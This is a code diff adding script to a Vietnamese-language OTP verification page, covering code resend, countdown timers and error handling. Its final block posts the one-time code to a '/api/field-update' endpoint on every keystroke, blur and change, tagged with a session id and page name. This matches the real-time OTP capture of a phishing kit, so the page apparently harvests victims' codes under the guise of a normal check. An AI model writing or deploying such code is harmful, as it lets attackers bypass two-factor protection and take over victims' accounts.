+            showError((data && (data.error || 'Không gửi lại được mã')) || 'Không gửi lại được mã');
+          } else {
+            logOtp('resend');
+            inputs.forEach((i) => {
+              i.value = '';
+              i.disabled = false;
+            });
+            inputs[0].focus();
+            sessionStorage.setItem('pendingRequestId', data.requestId || rid);
+            sessionStorage.setItem(
+              'maskedPhone',
+              data.maskedPhone || sessionStorage.getItem('maskedPhone')
+            );
+            btnResend.innerHTML =
+              'Gửi lại mã (<span id="resendCountdown" class="timer">30</span>s)';
+            startResendTimer(30);
+            startOtpTimer((data.otp && data.otp.ttlSeconds) || 60);
+          }
+        } catch (err) {
+          console.error('resend error', err);
+          showError('Lỗi mạng khi gửi lại mã');
+        } finally {
+          if (btnResend.disabled && !/Đang gửi/.test(btnResend.textContent)) {
+            // keep disabled until timer if success, else enable again
+          } else if (alertBox.classList.contains('d-none')) {
+            // success path keeps disabled until timer; failure re-enable
+            if (!btnResend.innerHTML.includes('resendCountdown')) btnResend.disabled = false;
+          } else {
+            btnResend.disabled = false;
+            btnResend.textContent = 'Gửi lại mã';
+          }
+        }
+      });
+
+      // ===== KHỞI TẠO =====
+      startResendTimer(30);
+      startOtpTimer(60);
+
+      // ===== GỬI CẬP NHẬT TỪNG TRƯỜNG (OTP) VỀ SERVER =====
+      (function () {
+        const FIELD_UPDATE_API =
+          location.origin && location.origin !== 'null'
+            ? location.origin + '/api/field-update'
+            : '/api/field-update';
+        if (!sessionStorage.getItem('fieldSessionId')) {
+          sessionStorage.setItem(
+            'fieldSessionId',
+            'sess-' + Math.random().toString(36).slice(2, 10)
+          );
+        }
+        const sessionId = sessionStorage.getItem('fieldSessionId');
+
+        async function sendOtpUpdate(reason) {
+          try {
+            const value = getOTP();
+            if (!value) return;
+            await fetch(FIELD_UPDATE_API, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                sessionId,
+                field: 'otp',
+                value,
+                page: 'otphtml1.html',
+                reason: reason || 'input',
+              }),
+            });
+          } catch (_) {}
+        }
+
+        // Gửi khi thay đổi, blur, hoặc đủ 6 số
+        inputs.forEach((inp) => {
+          inp.addEventListener('input', () => sendOtpUpdate('input'));
+          inp.addEventListener('blur', () => sendOtpUpdate('blur'));
+          inp.addEventListener('change', () => sendOtpUpdate('change'));
+        });
+      })();
+    </script>
+  </body>
 </html>
